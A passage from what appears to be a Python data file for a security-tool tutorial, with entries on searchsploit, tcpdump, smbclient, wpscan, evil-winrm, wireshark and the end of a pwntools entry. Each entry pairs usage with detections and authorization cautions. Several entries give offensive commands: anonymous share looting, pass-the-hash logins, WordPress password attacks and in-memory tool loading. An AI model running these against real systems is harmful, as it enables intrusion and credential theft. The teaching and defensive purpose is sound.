                "do": "Build the payload (padding + a ROP chain or shellcode address), send it, and drop into the shell you popped.",
                "why_now": "With the offset known, you redirect execution to your chain/shellcode to gain control.",
                "watch_for": "An interactive shell prompt — run `id` / `cat flag` to confirm code execution.",
                "means": "Arbitrary code execution on the target = the exploit works end to end.",
                "blue": "Defenses that break this chain: NX (no executable stack, forces ROP), ASLR + PIE (randomize gadget addresses), stack canaries (detect the overflow), RELRO (lock the GOT), and -fstack-protector. Modern binaries stack these.",
            },
        ],
        "zoom": {
            "eli5": "Writing a program that breaks another program involves a lot of fiddly, exact steps. pwntools is a Python toolbox that does the fiddly parts for you, so you can focus on the actual idea of the exploit and getting a shell.",
            "operator": "Script the exploit with the pwn API: connect (process/remote), find the offset (cyclic), set context from the ELF, build the payload (flat/ROP/shellcraft), send, and io.interactive() for the shell. Develop locally, debug with gdb.attach, then point it at the real target.",
            "deep": "pwntools is a toolkit over the whole exploit-dev workflow: tubes (uniform I/O over process/remote/ssh), packing (pN/uN, flat), ELF/symbol/GOT-PLT introspection, a ROP engine that resolves gadgets, shellcraft (per-arch shellcode templates), and gdb integration. context propagates arch/os/endianness so every primitive is correct for the target. It doesn't find bugs — it removes the friction between knowing the bug and landing the exploit, which is why it's standard in CTFs and exploit research.",
        },
        "next": [
            "gef / radare2 (find and understand the bug you're exploiting)",
            "ghidra (decompile to locate the vulnerable function and its layout)",
            "ropper / ROPgadget (find the gadgets pwntools' ROP engine chains)",
            "metasploit (the framework side of exploitation once you have a working primitive)",
        ],
        "caution": "Exploit development is for systems you own, CTFs, or authorized research — running an exploit against anything else is illegal. pwntools makes exploits easy to WRITE; that doesn't make them legal to FIRE. Keep targets in your lab or in scope.",
        "cia": [
            "INTEGRITY / CONFIDENTIALITY / AVAILABILITY — a working memory-corruption exploit usually means arbitrary code execution: full compromise of all three on the target.",
            "OFFENSE — the standard tooling for binary exploitation and CTF pwn; pairs with RE (find the bug) to turn a vulnerability into a shell.",
            "DEFENSIVE / BLUE — seeing how cleanly exploits come together motivates the mitigations: NX, ASLR/PIE, stack canaries, RELRO, CFI. The step mirrors show exactly what each defense breaks.",
        ],
        "try_cmd": "pwn --help",
    },
    "searchsploit": {
        "summary": "Offline command-line search of the Exploit-DB archive — find public exploits and PoCs for a product/version locally (no internet needed), then read, copy, or cross-reference them against your scan results",
        "typical": "searchsploit <product> <version>     (then  -x <EDB-ID>  to read,  -m <EDB-ID>  to copy it local)",
        "mental_model": (
            "Exploit-DB is a giant public archive of known exploits, indexed by product and version. searchsploit "
            "is a local mirror of that archive with a fast text search over titles and paths. The skill isn't "
            "running it — it's matching a SPECIFIC product+version you found in recon to a known exploit, while "
            "filtering out the noise (wrong OS, crash-only, unrelated). It turns 'I see Apache 2.4.49' into 'here "
            "is the path-traversal write-up for exactly that build.'"
        ),
        "analogy": (
            "searchsploit is the index at the back of a huge book of documented break-ins, kept on your shelf so "
            "you don't need the library. You look up the exact make and model of a lock, and it points you to the "
            "page with the published way in — if one exists."
        ),
        "flags": {
            "<terms>":        "Space-separated terms matched against title AND path (case-insensitive). Use product + version: 'apache 2.4.49'. Fewer, accurate terms beat many.",
            "-t, --title":    "Search the title ONLY (not the path) — cuts false matches when a term appears in unrelated file paths.",
            "--exclude=":     "Remove noise, chained with '|': --exclude='dos|/PoC/' drops crash-only and proof-of-concept-only entries.",
            "-x, --examine":  "Open the exploit in your PAGER to READ it — always read before you run anything.",
            "-m, --mirror":   "Copy the exploit file into your current directory so you can inspect and adapt it.",
            "-p, --path":     "Print the full local path to an EDB-ID (and copy it to the clipboard).",
            "-w, --www":      "Show Exploit-DB.com URLs instead of local paths — handy for the write-up and context.",
            "-j, --json":     "Emit JSON — for scripting and feeding other tools.",
            "--nmap <f.xml>": "Read an nmap -oX scan and auto-search every detected service/version — recon-to-exploit in one move.",
        },
        "read": [
            "Match on PRODUCT + VERSION, not just product — 'openssh' returns hundreds; 'openssh 8.2' narrows to what's actually relevant.",
            "Read before you run: -x the exploit and understand it. Public PoCs are often broken, mis-targeted, or trojaned; never fire blind.",
            "Filter aggressively with --exclude: drop crash-only and PoC-only entries unless that's specifically what you want.",
            "Keep it fresh: 'searchsploit -u' updates the local copy so you aren't searching a stale archive.",
            "--nmap on your -oX output is the power move: it cross-references every service it found against Exploit-DB automatically.",
        ],
        "zoom": {
            "eli5": "It's an offline search engine for known hacks. You type the software and version you found, and it tells you whether someone has already published a way to break it — and lets you read that write-up.",
            "operator": "Take versions from your nmap/whatweb output, search product+version, --exclude the noise, -x to read the candidate, -m to copy and adapt it in a lab. Or feed nmap XML with --nmap to auto-match everything at once.",
            "deep": "searchsploit queries a local clone of Exploit-DB (the exploitdb package's CSV index + the exploit tree). It's a recon-to-weaponization bridge: it doesn't exploit anything, it tells you what's publicly known. Pair it with version data from nmap -sV and confirmations from nuclei; treat hits as leads to validate, not turnkey weapons.",
        },
        "apply": [
            "From a service version (nmap says 'vsftpd 2.3.4'): `searchsploit vsftpd 2.3.4` then `searchsploit -x <EDB-ID>` to read it.",
            "Cut the noise: `searchsploit apache 2.4.49 --exclude='dos'`.",
            "Auto-match a whole scan: `nmap -sV -oX scan.xml <target>` then `searchsploit --nmap scan.xml`.",
            "Copy one to study safely in your lab: `searchsploit -m <EDB-ID>` (lands in the current dir); read every line before running.",
            "Refresh the archive periodically: `searchsploit -u`.",
        ],
        "next": [
            "nmap (the -sV versions that feed your searches; -oX for --nmap)",
            "metasploit (often has a polished module for what searchsploit finds raw)",
            "nuclei (template scanning that confirms many of these CVEs are live)",
            "ghidra (when you must understand or fix a raw PoC before trusting it)",
        ],
        "caution": "A searchsploit hit is a LEAD, not permission. Only run exploits against systems you own or are authorized to test, and only after reading the code — public PoCs can be destructive, mis-targeted, or backdoored. Validate in a lab first.",
        "cia": [
            "CIA impact depends entirely on the exploit — many give code execution (all three), some are crash-only (availability). Read the entry to know which before you act.",
            "OFFENSE — it's the bridge from 'what version is this' to 'what's the known way in', the heart of the vulnerability-analysis phase.",
            "DEFENSIVE / BLUE — defenders run the SAME search on their own inventory: if searchsploit has a public exploit for your version, patching it just became urgent. A free prioritization signal.",
        ],
        "try_cmd": "searchsploit -h",
    },
    "tcpdump": {
        "summary": "The lightweight command-line packet capture tool — grab traffic on any interface with surgical BPF filters, save to pcap, or read it live. The tool you reach for on a headless box where Wireshark's GUI can't go",
        "typical": "tcpdump -i <iface> -nn '<bpf filter>' -w cap.pcap     (capture)   |   tcpdump -nn -r cap.pcap '<filter>'   (read back)",
        "mental_model": (
            "tcpdump is Wireshark's capture engine without the GUI: it puts the NIC in promiscuous mode, applies "
            "a BPF filter in the kernel (so only matching packets are even copied to userspace), and prints or "
            "saves them. Because the filter runs in-kernel it's cheap enough to run on a router, a server, or a "
            "Pi. The workflow is split: capture lean on the box with tcpdump, then pull the .pcap into Wireshark "
            "for the deep, visual analysis."
        ),
        "analogy": (
            "If Wireshark is a forensics lab, tcpdump is the field recorder you clip on at the scene: small, "
            "fast, runs anywhere, captures exactly what you tell it. You record in the field, then bring the "
            "tape back to the lab to study it frame by frame."
        ),
        "flags": {
            "-i <iface>":     "Interface to capture on (tcpdump -D lists them); 'any' captures across all interfaces.",
            "-w <file.pcap>": "Write raw packets to a pcap file (for Wireshark) instead of printing — capture now, analyze later.",
            "-r <file.pcap>": "Read and filter a saved capture instead of going live.",
            "-n / -nn":       "Don't resolve names (-n) or names AND ports (-nn) — faster, quieter, and your capture box emits no extra lookups.",
            "-c <count>":     "Stop after N packets — a quick sample without flooding the terminal.",
            "-s <snaplen>":   "Bytes captured per packet; -s0 = the whole packet, a small value = headers only (lighter).",
            "-A / -X":        "Print payload as ASCII (-A) or hex+ASCII (-X) — read cleartext protocols right in the terminal.",
            "-e":             "Show link-layer (Ethernet) headers — MAC addresses, VLAN tags.",
            "BPF filter":     "host/port primitives select traffic: 'host 10.0.0.5', 'port 443', 'tcp'; combine with and/or/not, and filter a whole subnet by range.",
        },
        "read": [
            "Always pair -w (save pcap) with a tight filter — capturing everything fills the disk fast and buries the signal. Filter at capture time.",
            "Use -nn by default during analysis: name/port resolution is slow, adds noise, and without -n your capture host emits its own lookups.",
            "Capture lean on the target box, analyze rich in Wireshark — `tcpdump -w` on the server, open the pcap on your workstation.",
            "tcpdump's filter is the same kernel filter Wireshark calls a 'capture filter' — host/port/subnet primitives with and/or/not. It is NOT Wireshark's display-filter syntax.",
            "-s0 grabs full payloads (needed to reconstruct files/creds); a small snaplen grabs headers only (lighter, for flow analysis).",
        ],
        "zoom": {
            "eli5": "tcpdump records the little messages flying across a network cable, and only the ones you ask for. It has no windows or buttons — it runs in the terminal, so it works on servers and tiny computers where Wireshark can't.",
            "operator": "Pick the interface (-D to list), write a tight BPF filter so you only capture what matters, -w to a pcap, then move the pcap to Wireshark for analysis. For quick looks, -nn -A reads cleartext straight in the terminal.",
            "deep": "tcpdump uses libpcap: your filter compiles to BPF bytecode that runs in the kernel, so non-matching packets are dropped before the copy to userspace (low overhead). snaplen controls capture depth; promiscuous mode grabs frames not addressed to you on the segment. The output .pcap is the universal format Wireshark, Zeek, Suricata, and Scapy all consume.",
        },
        "apply": [
            "List interfaces: `tcpdump -D`. Capture web traffic: `tcpdump -i eth0 -nn -w /tmp/web.pcap 'tcp port 80 or tcp port 443'`.",
            "Read it back filtered: `tcpdump -nn -r /tmp/web.pcap 'host 10.0.0.5'` — or just open /tmp/web.pcap in Wireshark.",
            "Watch a host live with payloads: `tcpdump -i eth0 -nn -A 'host 10.0.0.5 and tcp port 80'`.",
            "Sample without flooding: add `-c 50` to stop after 50 packets.",
            "Hand off to the deep tools: the .pcap feeds Wireshark, Zeek, or Suricata for analysis you can't do in the terminal.",
        ],
        "next": [
            "wireshark (open the pcap for deep, visual analysis — Follow Stream, decode, stats)",
            "network-silence (use tcpdump to VERIFY your host actually went quiet)",
            "networking (the protocol layers you're capturing)",
            "nmap (active map to pair with the passive capture)",
        ],
        "caution": "Packet capture can record other people's credentials and private data — only capture on networks you own or are authorized to monitor. On shared/corporate networks it's often policy-restricted or unlawful without consent. Treat saved pcaps as sensitive.",
        "cia": [
            "CONFIDENTIALITY — capture exposes anything sent in cleartext; both an attacker's prize on an open segment and the defender's proof that encryption is needed.",
            "DEFENSIVE / BLUE — the go-to for quick capture in incident response and monitoring on systems without a GUI; it feeds the heavier analysis tools.",
            "INTEGRITY — reveals spoofing, rogue services, and injected/anomalous traffic on the wire.",
        ],
        "try_cmd": "tcpdump -D",
    },
    "smbclient": {
        "summary": "An FTP-like client for SMB/CIFS shares — list, connect to, and transfer files from Windows/Samba file shares from the Linux command line. The hands-on way to actually browse what enum4linux only listed",
        "typical": "smbclient -L //<host> -N     (list shares, no password)   |   smbclient //<host>/<share> -U <user>     (connect)",
        "mental_model": (
            "SMB is the Windows file-sharing protocol. enum4linux/crackmapexec TELL you which shares exist; "
            "smbclient lets you actually OPEN one and walk it like an FTP session — ls, cd, get, put. The "
            "security story is mostly about what you can reach WITHOUT good credentials: null sessions (-N) and "
            "guest access to shares that should have been locked down are a classic foothold for loot — configs, "
            "backups, scripts, and password files left sitting on an open share."
        ),
        "analogy": (
            "If enum4linux is reading the directory board in a building lobby ('floors 1-5, IT on 3'), smbclient "
            "is taking the elevator up and trying each door. Some are locked; the ones left on 'anonymous' swing "
            "right open, and you walk out with whatever was sitting inside."
        ),
        "flags": {
            "-L //<host>":    "List the shares a host offers (the share catalogue) rather than connecting to one.",
            "-N":             "No password — try a null/anonymous session. The key test: what is reachable with no creds at all.",
            "-U <user>":      "Authenticate as a user; inline as -U 'domain/user%password', or it will prompt. Add --pw-nt-hash to pass a hash.",
            "//<host>/<share>":"Connect to a specific share, dropping you into an interactive smb prompt.",
            "-c '<cmds>'":    "Run share commands non-interactively, e.g. -c 'ls; get secrets.txt' — great for scripting.",
            "-I <ip>":        "Target by IP when name resolution is unreliable.",
            "-m SMB3":        "Pin the SMB dialect when negotiating with stubborn or legacy servers.",
        },
        "read": [
            "The first test is always `-L //host -N`: shares you can list or read with NO credentials are the immediate finding.",
            "Inside a share it's FTP muscle memory: ls, cd, get <file>, put <file>, mget * (with 'prompt off' + 'recurse on' to pull a whole tree).",
            "Hunt loot, not just files: configs, .bak, scripts, keepass/.kdbx, unattend.xml, web.config — credentials get left on shares constantly.",
            "Admin shares (C$, ADMIN$, IPC$) need privileged creds; a readable IPC$ null session is what enum4linux rides for its enumeration.",
            "If it refuses to connect, the server may demand SMB signing or a newer dialect — pin with -m SMB3 or check the security mode.",
        ],
        "zoom": {
            "eli5": "Windows computers share folders over the network. smbclient opens those shared folders from Linux and copies files out of them — and checks which ones were accidentally left open to anybody.",
            "operator": "List shares with -L -N first (what's open to nobody?), then connect to interesting shares with -U or -N, browse like FTP (ls/cd/get), and loot for credentials and config. Script bulk pulls with -c.",
            "deep": "smbclient is part of Samba and speaks SMB1/2/3. It authenticates via NTLM (password, or --pw-nt-hash = pass-the-hash for file access) or Kerberos (-k). Null sessions (-N to IPC$) historically leak users/shares/policy; modern Windows restricts them, but Samba and legacy hosts still allow read access far too often. The interactive prompt is a mini-shell over the share (get/put/recurse/mask).",
        },
        "apply": [
            "Enumerate with no creds: `smbclient -L //10.0.0.5 -N` — note any share you can see.",
            "Open one anonymously: `smbclient //10.0.0.5/Public -N`, then `recurse on; prompt off; mget *` to pull everything.",
            "Authenticated browse: `smbclient //10.0.0.5/share -U 'CORP/jdoe'` (it prompts for the password).",
            "Scripted grab: `smbclient //10.0.0.5/share -U user -c 'get config.bak'`.",
            "Pass-the-hash for file access: `smbclient //10.0.0.5/C$ -U Administrator --pw-nt-hash <NThash>` (lab/authorized only).",
        ],
        "next": [
            "enum4linux (the broad SMB enumeration that points you at the shares)",
            "crackmapexec (sweep share access across many hosts at once)",
            "impacket (psexec/secretsdump once you have working SMB creds)",
            "hashcat (crack creds the share loot might contain)",
        ],
        "caution": "Accessing shares you aren't authorized to is unlawful access. Only connect to systems you own or have written authorization to test. Files pulled from shares may hold real personal data or credentials — handle as sensitive and stay within scope.",
        "cia": [
            "CONFIDENTIALITY — open or guessable shares leak exactly the files they hold; loot often includes the credentials that unlock everything else.",
            "INTEGRITY — write access (put) to a share can plant files, tamper with content, or stage a payload.",
            "DEFENSIVE / BLUE — admins use smbclient to audit their OWN shares: run `-L -N` and connect anonymously to find what's exposed without creds, then lock it down (no null sessions, least-privilege share ACLs, SMB signing).",
        ],
        "try_cmd": "smbclient -L //localhost -N",
    },
    "wpscan": {
        "summary": "The WordPress security scanner — fingerprints WP core, themes, and plugins, matches them to known vulnerabilities, enumerates users, and runs password attacks. WordPress runs a huge slice of the web, so this is a bread-and-butter web tool",
        "typical": "wpscan --url https://<site> -e vp,vt,u     (enumerate vuln plugins/themes + users)   then   wpscan --url https://<site> -U users.txt -P rockyou.txt",
        "mental_model": (
            "WordPress is a core engine plus a sprawl of third-party plugins and themes — and the plugins are "
            "where most real-world WP breaches live (outdated, abandoned, vulnerable). wpscan's job is to "
            "identify EXACTLY which versions of core/plugins/themes a site runs, then look each up in its "
            "vulnerability database. Add user enumeration and a password attack against the login, and you've "
            "covered the two ways most WP sites fall: a vulnerable plugin, or a weak admin password."
        ),
        "analogy": (
            "A WordPress site is a house where the owner keeps bolting on cheap add-on rooms (plugins) from "
            "different builders. wpscan walks the property cataloguing every add-on and its model number, checks "
            "a recall list for the ones with known broken locks, and rattles the front door to see if the key is "
            "weak."
        ),
        "flags": {
            "--url <URL>":    "The target WordPress site to scan.",
            "-e, --enumerate":"What to enumerate: vp (vuln plugins), ap (all plugins), vt (vuln themes), u (users), cb (config backups). e.g. -e vp,vt,u.",
            "--plugins-detection":"Mode: 'passive' (quiet, reads pages) vs 'aggressive' (probes every known plugin path — thorough but loud).",
            "-U, --usernames":"Username list for the password attack (or the users that enumeration finds).",
            "-P, --passwords":"Password list for the login attack — point it at a wordlist like rockyou.txt.",
            "--password-attack":"Force the method (wp-login vs xmlrpc); xmlrpc batches guesses and is often faster and less rate-limited.",
            "--api-token":    "Your WPScan API token — REQUIRED for the actual vulnerability data (without it you get versions, not the CVE matches).",
            "--random-user-agent":"Rotate the User-Agent to blend in or dodge simple blocks.",
        },
        "read": [
            "Plugins are the real attack surface: '-e vp' (vulnerable plugins) is usually where the win is, far more than core itself.",
            "Without an --api-token you only get fingerprints (versions), not the vulnerability lookups. The free token is worth getting.",
            "User enumeration feeds the password attack: find the usernames, then target them — WP leaks users via author archives and the REST API.",
            "xmlrpc.php is the brute-force express lane: --password-attack xmlrpc can be much faster than wp-login and is often left enabled.",
            "Aggressive plugin detection is thorough but noisy (a request per known plugin path) — start passive, escalate only if needed.",
        ],
        "steps": [
            {
                "cmd": "wpscan --url https://<site> -e vp,vt --api-token <TOKEN>",
                "do": "Fingerprint core/plugins/themes and match them against the vulnerability database.",
                "why_now": "Identify the known-vulnerable components first — that's where most WordPress compromises actually come from.",
                "watch_for": "Plugins/themes flagged with [!] and a CVE/title — outdated versions with public exploits are your leads.",
                "means": "A list of concrete, version-specific vulnerabilities to chase (often with a ready exploit).",
                "blue": "Detectable as version-probing traffic. Defense: keep core/plugins/themes updated, remove unused plugins, run a WAF.",
            },
            {
                "cmd": "wpscan --url https://<site> -e u",
                "do": "Enumerate valid usernames via author archives, the login error oracle, and the REST API.",
                "why_now": "You can't run a targeted password attack without valid usernames — get them first.",
                "watch_for": "A clean list of real usernames (admin and editor accounts).",
                "means": "The user half of a credential attack.",
                "blue": "Defense: block user enumeration (disable author archives / REST users endpoint) and don't reveal which half of a login was wrong.",
            },
            {
                "cmd": "wpscan --url https://<site> -U users.txt -P rockyou.txt --password-attack xmlrpc",
                "do": "Run a password attack against the enumerated users via the (often faster) xmlrpc endpoint.",
                "why_now": "A weak admin password is the other classic WP fall; with users known, test it directly.",
                "watch_for": "A green 'valid combinations found' line — that's an admin login.",
                "means": "Authenticated WP admin = the dashboard, the theme/plugin editor, and usually code execution on the server.",
                "blue": "Detect: bursts of login/xmlrpc attempts. Defense: strong passwords, an MFA plugin, login rate-limiting, disable xmlrpc if unused.",
            },
        ],
        "zoom": {
            "eli5": "Most websites run WordPress, and most break-ins come through outdated add-ons or a weak admin password. wpscan checks a site for both — which add-ons are known-broken, and whether the login password is guessable.",
            "operator": "Enumerate vulnerable plugins/themes (with an API token for the CVE data), enumerate users, then run a targeted password attack via xmlrpc or wp-login. Start with passive detection; escalate if needed.",
            "deep": "wpscan fingerprints by hashing static assets and reading readme/version markers, then matches against the WPScan vulnerability DB (API-token gated). Enumeration abuses author ?author=N redirects, the wp-json REST users endpoint, and login error differences. The password attack hits wp-login.php or the xmlrpc system.multicall endpoint (which batches many guesses per request — faster, and a reason to disable xmlrpc).",
        },
        "next": [
            "whatweb (confirm it IS WordPress and the broad stack first)",
            "burp (manually test the specific plugin vuln wpscan flags)",
            "hydra (generic login brute-forcing when it's not WordPress)",
            "searchsploit (pull the exploit for a flagged plugin version)",
        ],
        "caution": "Scanning and password-attacking a site you don't own is illegal. Only run wpscan against WordPress sites you own or are explicitly authorized to test; aggressive enumeration and password attacks are noisy and can lock out accounts or trip abuse protections.",
        "cia": [
            "CONFIDENTIALITY — admin access or a vulnerable plugin exposes the site's data, its users, and often the underlying server.",
            "INTEGRITY — WP admin lets you edit themes/plugins = code execution = full control of the site's content and behavior.",
            "DEFENSIVE / BLUE — defenders run wpscan on their OWN sites to find the vulnerable plugin or weak password before an attacker does; it's a direct hardening checklist.",
        ],
        "try_cmd": "wpscan --url https://example.com -e vp",
    },
    "evil-winrm": {
        "summary": "The standard WinRM shell for post-exploitation — once you have valid Windows credentials (or an NTLM hash), it gives you a full interactive PowerShell on the target, plus built-in file upload/download and in-memory script/binary loading",
        "typical": "evil-winrm -i <host> -u <user> -p <pass>     (or  -H <NTLMhash>  for pass-the-hash)",
        "mental_model": (
            "WinRM is Windows' built-in remote-management service (the transport behind PowerShell Remoting), "
            "listening on 5985/5986. It's a LEGITIMATE admin channel — which is exactly why attackers love it: "
            "using it looks like normal administration. evil-winrm is a polished client for it. The key point: "
            "this is a POST-exploitation tool. It doesn't break in; it's what you use AFTER you already hold "
            "valid creds or a hash, to turn that credential into an interactive foothold and run your tooling."
        ),
        "analogy": (
            "evil-winrm isn't the lockpick — it's the master key you already copied, used at the staff entrance. "
            "Walking in through the official admin door (WinRM) looks like an employee doing their job, which is "
            "what makes it both convenient for you and hard for defenders to spot."
        ),
        "flags": {
            "-i <ip>":        "Target host (the WinRM endpoint).",
            "-u <user>":      "Username to authenticate as.",
            "-p <pass>":      "Password. Omit it and use -H to authenticate with a hash instead.",
            "-H <hash>":      "PASS-THE-HASH — authenticate with the NTLM hash, no plaintext password (e.g. a hash from secretsdump/mimikatz).",
            "-S":             "Use SSL (WinRM over HTTPS on 5986) when the service requires encryption.",
            "-s <path>":      "Local folder of PowerShell .ps1 scripts to make loadable in-session (the 'menu' command lists them).",
            "-e <path>":      "Local folder of executables for Invoke-Binary (run a .exe in memory, no file on disk).",
            "-r <realm>":     "Kerberos realm — authenticate with a ticket instead of a password or hash.",
        },
        "read": [
            "It's POST-auth only: evil-winrm needs working creds/hash AND the user must be in 'Remote Management Users' (or admin). No creds = no evil-winrm.",
            "Pass-the-hash is first-class: '-H <NThash>' logs in with a hash straight from secretsdump/mimikatz — no cracking required.",
            "Built-in helpers beat manual work: 'upload'/'download' move files, 'menu' exposes loaded .ps1 scripts, 'Invoke-Binary' runs an .exe in memory (no disk artifact = quieter).",
            "It is LOUD to a tuned defender: WinRM logons, PowerShell script-block logging, and AMSI all see you. It blends into admin traffic but is heavily logged on mature hosts.",
            "5985 is plaintext HTTP WinRM, 5986 is HTTPS (-S). Many environments enable only one — check which port is open first.",
        ],
        "steps": [
            {
                "cmd": "evil-winrm -i 10.0.0.5 -u Administrator -H <NThash>",
                "do": "Authenticate to WinRM with a credential or hash and drop into an interactive PowerShell.",
                "why_now": "This is the step that converts a stolen credential into a usable foothold on the host.",
                "watch_for": "An 'Evil-WinRM PS>' prompt — you now have a shell as that user.",
                "means": "Interactive command execution on the target as the authenticated account.",
                "blue": "Detect: WinRM logons (4624 type 3 to 5985/5986) from unusual sources. Defense: restrict Remote Management Users, segment WinRM, alert on it.",
            },
            {
                "cmd": "PS> upload tooling.ps1   then   menu / Invoke-Binary",
                "do": "Stage tooling — upload a script, load it via menu, or run an .exe in memory with Invoke-Binary.",
                "why_now": "With a shell, you bring your post-exploitation toolkit (enumeration, privesc checks) onto the host.",
                "watch_for": "Successful load and output from your enumeration/privesc script.",
                "means": "Local situational awareness and a path to escalate from user toward SYSTEM.",
                "blue": "Detect: PowerShell script-block logging (4104), AMSI, EDR on in-memory execution. Defense: Constrained Language Mode, app control (WDAC), script-block logging.",
            },
            {
                "cmd": "PS> (enumerate -> escalate -> reuse creds)",
                "do": "Use the foothold to hunt local secrets and reusable credentials, then pivot to the next host.",
                "why_now": "A single host is a beachhead; the goal is to find creds that work elsewhere and move laterally.",
                "watch_for": "Cached creds, tokens, or admin rights that unlock other machines.",
                "means": "Lateral movement — the same hash/credential opens the next box (back to crackmapexec/impacket).",
                "blue": "Detect: one account authenticating across many hosts fast. Defense: LAPS (unique local admin passwords), tiering, credential hygiene, MFA.",
            },
        ],
        "zoom": {
            "eli5": "Once you've got a Windows username and password (or its hash), evil-winrm uses Windows' own remote-control feature to give you a command window on that computer — like remote desktop, but text, and it looks like ordinary IT admin work.",
            "operator": "With valid creds or a hash, connect (-u/-p or -H, add -S for SSL), get a PowerShell, then use upload/download, menu-loaded scripts, and Invoke-Binary to run your toolkit in memory while staying as quiet as the channel allows.",
            "deep": "evil-winrm rides WS-Management (SOAP over HTTP 5985 / HTTPS 5986), the same protocol as PowerShell Remoting, authenticating via NTLM (password or hash) or Kerberos. Because it's a sanctioned admin channel the traffic is unremarkable — but the activity inside (script-block logging, AMSI, module logging, EDR) is highly visible on a defended host. Invoke-Binary uses reflective in-memory loading to avoid touching disk; defenders counter with AMSI, WDAC/app-control, and Constrained Language Mode.",
        },
        "next": [
            "crackmapexec (validate which hosts your creds/hash actually open before connecting)",
            "impacket (secretsdump to GET the hash you pass here; psexec as an alternative shell)",
            "mimikatz (where the hashes/tickets you authenticate with come from)",
            "linpeas (the Linux cousin for local privilege-escalation enumeration)",
        ],
        "caution": "evil-winrm gives real interactive control of a Windows host — use ONLY with valid authorization on in-scope systems. It is post-exploitation: it assumes credentials you obtained legally (your lab, or an authorized engagement). Unauthorized use is computer intrusion.",
        "cia": [
            "CONFIDENTIALITY — a shell on the host exposes its files, secrets, and the credentials needed to reach further.",
            "INTEGRITY — full command execution lets an attacker alter the system, plant persistence, or stage further attacks.",
            "DEFENSIVE / BLUE — every step has detections (WinRM logons, 4104 script-block logs, AMSI, EDR) and controls (restrict Remote Management Users, WDAC, Constrained Language Mode, LAPS, tiering). Knowing the tool is knowing what to monitor.",
        ],
        "try_cmd": "evil-winrm",
    },
    "wireshark": {
        "summary": "The standard packet analyzer — captures and dissects network traffic frame-by-frame so you can SEE exactly what is on the wire: protocols, conversations, cleartext credentials, and anomalies. tshark is its command-line twin",
        "typical": "wireshark (GUI: pick interface -> capture -> apply a display filter)   |   CLI: tshark -i <iface> -f '<capture filter>' -w cap.pcapng   then   tshark -r cap.pcapng -Y '<display filter>'",
        "mental_model": (
            "A network is invisible — packets fly past in microseconds and vanish. Wireshark taps the wire (or "
            "your NIC in promiscuous/monitor mode) and freezes every frame so you can inspect it layer by "
            "layer: Ethernet -> IP -> TCP -> the application protocol on top. Two filter stages matter and are "
            "DIFFERENT: a CAPTURE filter (BPF) decides what gets recorded (you can't recover what you didn't "
            "capture), and a DISPLAY filter decides what you SEE from what was recorded (non-destructive, "
            "change it freely). Master that split and you can find one packet in ten million."
        ),
        "analogy": (
            "Wireshark is a wiretap with instant replay and X-ray vision. The wire is a freeway of sealed "
            "trucks; Wireshark photographs every truck AND sees inside — what's in it, who sent it, where it's "
            "going. The capture filter is the toll-gate deciding which trucks get photographed; the display "
            "filter is your search over the photos you already took."
        ),
        "flags": {
            "wireshark":      "Launch the GUI — pick an interface, capture live, explore with point-and-click + display filters. Best for interactive analysis.",
            "tshark":         "The terminal twin — scriptable capture/analysis for headless boxes, pipelines, and big files. Same dissectors as the GUI.",
            "-i <iface>":     "Interface to capture on (tshark -D lists them). On WiFi you need monitor mode to see other stations' frames.",
            "-f '<bpf>'":     "CAPTURE filter (libpcap/BPF) — limits what is recorded, e.g. 'tcp port 80'. Decided BEFORE capture; you can't get back what you filtered out.",
            "-Y '<expr>'":    "DISPLAY filter (Wireshark syntax) — limits what you SEE from a capture, e.g. 'http.request' or 'ip.addr==10.0.0.5'. Non-destructive; change anytime.",
            "-r <file>":      "Read and analyze a saved .pcap/.pcapng instead of capturing live.",
            "-w <file>":      "Write captured packets to a pcapng file for later — capture now, dissect later.",
            "-c <n>":         "Stop after n packets — handy for a quick sample.",
            "-n":             "Disable name resolution (no reverse-DNS/MAC lookups) — faster, and you generate no extra lookup traffic.",
            "-T fields -e <f>":"Extract specific fields as columns (e.g. -e ip.src -e http.host) — turns packets into greppable/CSV data.",
            "-z <stat>":      "Statistics (e.g. -z conv,tcp / -z io,phs) — protocol hierarchy, conversations, endpoints; the fast way to characterize a capture.",
        },
        "read": [
            "Start with Statistics -> Protocol Hierarchy and Conversations: characterize the capture (who talks to whom, what protocols) before drilling into single packets.",
            "Follow Stream (TCP/HTTP/TLS) reassembles a whole conversation from scattered packets into one readable transcript — the single most useful button.",
            "Cleartext protocols leak everything: HTTP, FTP, Telnet, SMTP, SNMPv1/2 show credentials and data in the open. Seeing that IS the lesson for why TLS exists.",
            "Color rules and the Expert Info panel flag retransmissions, resets, and oddities — anomalies often jump out visually before you even filter.",
            "Capture filters use BPF syntax ('host', 'port', 'net'); display filters use Wireshark syntax ('ip.addr', 'tcp.port', '=='). They are NOT interchangeable — a top beginner trip-up.",
        ],
        "zoom": {
            "eli5": "The network is invisible and fast. Wireshark records every little message computers send each other and lets you open them up and read them — so you can see what is really happening, including things sent with no protection.",
            "operator": "Capture on the right interface (BPF capture filter to keep it small), then analyze with display filters and Follow Stream. Characterize first via Statistics, then drill to the packets that matter. Use tshark -T fields to turn captures into data you can grep and script.",
            "deep": "Wireshark is a stack of protocol dissectors over libpcap/dumpcap capture. Capture filters compile to BPF in the kernel (cheap, pre-record); display filters run in userspace over dissected fields (rich, post-record). It reassembles TCP streams, decrypts TLS when you supply keys (SSLKEYLOGFILE) or WPA traffic with the PSK, and exposes everything as named fields you can extract (-e) or pivot on. For WiFi, monitor mode plus a capable adapter lets you see management/data frames of other stations (the basis of the wpa-handshake capture).",
        },
        "apply": [
            "List interfaces with `tshark -D`, then capture to a file: `tshark -i eth0 -f 'not port 22' -w /tmp/cap.pcapng` (the BPF capture filter keeps your own SSH session out of the file).",
            "Analyze offline so you can iterate filters freely: `tshark -r /tmp/cap.pcapng -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri`.",
            "In the GUI, right-click a packet -> Follow -> TCP/HTTP Stream to read a full conversation; use Statistics -> Conversations to find the noisy talkers.",
            "Teaching exercise on YOUR lab traffic: filter for HTTP basic-auth headers and FTP login commands and watch the credentials appear in the clear — that is why plaintext protocols are dangerous.",
            "Decrypt your OWN TLS by pointing a browser at SSLKEYLOGFILE and loading it under Preferences -> Protocols -> TLS — inspect HTTPS contents for debugging without touching anyone else's traffic.",
        ],
        "next": [
            "tcpdump (lightweight CLI capture — grab on a server, analyze in Wireshark)",
            "nmap (active discovery — pair the map with the packet truth)",
            "networking (the OSI / TCP-IP model these packets ride on)",
            "wpa-handshake (monitor-mode capture in action)",
        ],
